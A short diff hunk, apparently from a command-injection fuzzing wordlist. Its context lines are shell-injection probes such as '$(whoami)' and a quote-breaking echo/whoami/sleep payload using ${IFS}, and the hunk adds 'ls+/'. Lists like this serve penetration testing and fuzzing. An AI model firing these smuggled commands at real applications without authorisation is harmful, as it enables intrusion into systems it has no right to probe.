@@ -37,3 +37,4 @@ $(whoami)
 ;echo V*
 ;who*
 ';echo${IFS}VULN&&whoami||sleep${IFS}5#
+ls+/
